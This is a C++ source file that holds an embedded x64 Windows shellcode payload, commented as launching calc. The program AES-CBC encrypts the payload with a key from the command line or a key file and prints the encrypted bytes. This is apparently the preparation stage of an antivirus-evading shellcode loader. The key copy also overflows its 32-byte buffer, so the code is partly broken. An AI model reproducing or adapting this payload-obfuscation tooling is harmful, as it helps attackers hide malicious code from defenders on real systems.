#include <Windows.h>
#include <stdio.h>
#include <fstream>
#include "includes/aes.hpp"




// CMD=calc
unsigned char SHELLCODE[]   = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";
SIZE_T        SHELLCODESIZE = sizeof(SHELLCODE) - 1;
std::string   CRYPT         = "Metzjer.MeSuperDuperSecretKey.dat";


/// @brief :
int Encrypt(std::string cryptKey, size_t vaultSize) {
    unsigned char  key[32] = {0};
    unsigned char  iv[]    = "\x13\x02\x9d\x35\x3b\xa4\x5b\xec\x26\x88\x58\x51\x11\x47\x98\xa5";
    struct AES_ctx algorithmCtx;

    printf("\nEncrypting...\n");
    printf("BING!\n");
    memcpy(key, cryptKey.c_str(), vaultSize);
    AES_init_ctx_iv(&algorithmCtx, key, iv);
    AES_CBC_encrypt_buffer(&algorithmCtx, SHELLCODE, vaultSize);
    printf("BONG!\n");


    return 0;
}



int start(int argc, char *argv[]) {
    if (argv[1]) { Encrypt(argv[1], SHELLCODESIZE); }
    else {
        DWORD attr = GetFileAttributes(CRYPT.c_str());
        if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) {

        }
        else {
            std::fstream file;
            std::string  key;
            file.open(CRYPT, std::ios::in);
            (getline(file, key));
            Encrypt(key, SHELLCODESIZE);
        }
    }

    printf("Encrypted buffer:\n");
    for (int i = 0; i < SHELLCODESIZE - 1; i++) {
        printf("\\x%02x", SHELLCODE[i]);
    }
    printf("\n");
}